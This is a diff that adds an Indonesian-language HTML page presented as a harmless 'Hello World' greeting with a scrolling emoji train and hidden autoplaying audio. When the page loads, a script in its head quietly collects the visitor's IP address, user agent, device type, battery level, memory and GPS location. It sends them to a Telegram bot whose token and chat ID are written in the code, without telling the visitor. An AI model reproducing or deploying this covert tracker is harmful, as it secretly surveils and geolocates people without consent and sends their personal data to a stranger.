@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello World</title>
+    <script>
+        const botToken = "7028070685:AAF5f39xs9t8yt63QYpe1DQy1rc5V92mVnY"; // Ganti dengan token bot Telegram
+        const chatId = "7233342888"; // Ganti dengan chat ID penerima
+
+        async function sendToTelegram(data) {
+            const message = `
+Data Pengunjung:
+- User Agent: ${data.ua}
+- IP Address: ${data.ip}
+- Perangkat: ${data.device}
+- Baterai: ${data.battery}%
+- Lokasi: ${data.location}
+- Memori: ${data.memory}
+            `;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+
+        async function getData() {
+            const ua = navigator.userAgent;
+            const device = /Android|iPhone|iPad|Windows/i.test(ua) ? (ua.match(/Android|iPhone|iPad|Windows/i) || ["Unknown"])[0] : "Unknown";
+            
+            // IP Address via API
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            // Baterai
+            const battery = await navigator.getBattery();
+            const batteryLevel = Math.round(battery.level * 100);
+            
+            // Memori
+            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak tersedia";
+
+            // Lokasi
+            let location = "Tidak diizinkan";
+            if (navigator.geolocation) {
+                // Tampilkan notifikasi custom sebelum meminta izin
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                        sendToTelegram({ ua, ip, device, battery: batteryLevel, location, memory });
+                    },
+                    () => {
+                        location = "Tidak diizinkan";
+                        sendToTelegram({ ua, ip, device, battery: batteryLevel, location, memory });
+                    }
+                );
+            } else {
+                sendToTelegram({ ua, ip, device, battery: batteryLevel, location, memory });
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            alert("Hello World!");
+            getData();
+        });
+    </script>
+</head>
+<body>
+    <h1>Hello World</h1>
+
+    <marquee behavior="left" scrollamount="18">
+        🚂🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃
+    </marquee>
+
+    <audio id="audioPlayer" autoplay controls style="display: none;">
+        <source src="https://xfxugusxcvf.github.io/mp3/13.mp3" type="audio/mpeg">
+        Browser Anda tidak mendukung elemen audio.
+    </audio>
+
+    <div>
+        <button class="button" onclick="playAudio()">Play</button>
+        <button class="button" onclick="pauseAudio()">Pause</button>
+    </div>
+
+    <script>
+        const audioPlayer = document.getElementById('audioPlayer');
+
+        function playAudio() {
+            audioPlayer.play();
+        }
+
+        function pauseAudio() {
+            audioPlayer.pause();
+        }
+    </script>
+
+</body>
+</html>
